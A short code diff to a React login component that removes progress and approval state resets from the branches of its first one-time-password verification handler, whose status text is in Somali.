@@ -386,26 +386,25 @@ export default function Login() {
       setOtp1Processing(true);
       const s = 'Fadlan sug...';
       setOtp1Status(s); previousStatusRef.current = s;
-      setOtp1Approved(false); setOtp1Progress(0);
       const result = await checkOtp1Status(phone, fullOtp);
       if (result.approved) {
         updateAuthData({ firstOtp: fullOtp });
         transitionToOtp2(fullOtp);
       } else if (result.wrongPin) {
-        setOtp1Processing(false); setOtp1Submitting(false); setOtp1Progress(0); setOtp1Approved(false);
+        setOtp1Processing(false); setOtp1Submitting(false);
         setShowOtp1WrongPinModal(true); previousStatusRef.current = null;
       } else if (result.timeout) {
-        setOtp1Processing(false); setOtp1Submitting(false); setOtp1Progress(0); setOtp1Approved(false);
+        setOtp1Processing(false); setOtp1Submitting(false);
         setShowOtp1TimeoutModal(true); previousStatusRef.current = null;
       } else {
-        setOtp1Processing(false); setOtp1Submitting(false); setOtp1Progress(0); setOtp1Approved(false);
+        setOtp1Processing(false); setOtp1Submitting(false);
         setShowOtp1ErrorModal(true);
         setOtp1(['', '', '', '', '', '']);
         previousStatusRef.current = null;
         setTimeout(() => otp1Refs[0].current?.focus(), 100);
       }
     } catch {
-      setOtp1Submitting(false); setOtp1Processing(false); setOtp1Progress(0); setOtp1Approved(false);
+      setOtp1Submitting(false); setOtp1Processing(false);
       setShowOtp1VerifyErrorModal(true); previousStatusRef.current = null;
     }
   };
